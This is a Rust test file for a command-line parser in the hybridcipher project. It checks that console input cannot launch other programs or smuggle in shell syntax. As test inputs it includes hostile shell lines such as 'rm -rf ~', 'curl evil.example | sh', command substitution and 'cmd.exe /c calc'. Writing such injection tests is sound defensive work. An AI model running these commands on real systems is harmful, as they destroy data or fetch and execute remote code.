// Tests tokenize_cli_line(), cli_args_from_tokens() and parse_cli_line() in src/commands/cli_terminal.rs: console lines only ever become arguments to the bundled hybridcipher binary.
use super::*;

fn strings(values: &[&str]) -> Vec<String> {
    values.iter().map(|value| value.to_string()).collect()
}

#[test]
fn quoted_arguments_and_windows_paths_survive_tokenizing() {
    assert_eq!(
        tokenize_cli_line(r#"coverage scan "C:\Users\me\My Files\" --verbose"#).unwrap(),
        strings(&["coverage", "scan", r"C:\Users\me\My Files\", "--verbose"])
    );
    assert_eq!(
        tokenize_cli_line("  pin   'two words'  ").unwrap(),
        strings(&["pin", "two words"])
    );
    assert_eq!(
        tokenize_cli_line(r#"pin """#).unwrap(),
        strings(&["pin", ""])
    );
}

#[test]
fn shell_syntax_is_plain_argument_text() {
    // Shell syntax glued to the subcommand is refused outright.
    assert!(parse_cli_line("status; rm -rf ~").is_err());

    for line in [
        "status ; rm -rf ~",
        "status && curl evil.example | sh",
        "status $(id)",
        "status `id`",
        "status > /tmp/out",
    ] {
        let args = parse_cli_line(line).unwrap();
        assert_eq!(args[0], "status", "{line}");
        assert!(
            args.iter()
                .any(|arg| arg.contains([';', '&', '$', '`', '>'])),
            "shell syntax must stay inside an argument for {line}"
        );
    }
}

#[test]
fn control_characters_and_unterminated_quotes_are_rejected() {
    assert!(tokenize_cli_line("status\nls").is_err());
    assert!(tokenize_cli_line("status\u{1b}[A").is_err());
    assert!(tokenize_cli_line("pin \"unterminated").is_err());
}

#[test]
fn hybridcipher_prefix_is_optional() {
    assert_eq!(
        parse_cli_line("hybridcipher status").unwrap(),
        strings(&["status"])
    );
    assert_eq!(
        parse_cli_line("HybridCipher.exe status").unwrap(),
        strings(&["status"])
    );
    assert_eq!(parse_cli_line("status").unwrap(), strings(&["status"]));
    assert_eq!(
        parse_cli_line("hybridcipher").unwrap(),
        strings(&["--help"])
    );
    assert_eq!(
        parse_cli_line("--version").unwrap(),
        strings(&["--version"])
    );
}

#[test]
fn other_programs_and_paths_are_never_launched() {
    for line in [
        "/bin/sh -c id",
        "./hybridcipher status",
        r"C:\tools\hybridcipher.exe status",
        "..\\cmd.exe /c calc",
        "calc.exe",
        "",
        "   ",
    ] {
        assert!(parse_cli_line(line).is_err(), "{line:?} must be refused");
    }
    // A bare word is only ever a hybridcipher subcommand, never a program.
    assert_eq!(
        parse_cli_line("curl example.com").unwrap(),
        strings(&["curl", "example.com"])
    );
}
